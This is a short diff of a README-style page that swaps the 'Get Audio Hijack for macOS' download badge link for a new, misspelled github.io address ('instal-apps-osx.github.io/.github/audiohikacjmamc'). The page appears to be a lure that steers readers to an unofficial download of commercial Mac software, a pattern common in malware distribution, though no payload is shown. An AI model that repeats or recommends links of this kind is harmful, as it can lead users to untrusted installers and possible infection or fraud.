@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://app-get-osx.github.io/.github/audiohijackmac">  
+<a href="https://instal-apps-osx.github.io/.github/audiohikacjmamc">  
 <img src="https://img.shields.io/badge/Get_Audio_Hijack_for_macOS-007AFF?style=for-the-badge&logo=apple" alt="Get Audio Hijack">  
 </a>  
 </div>  
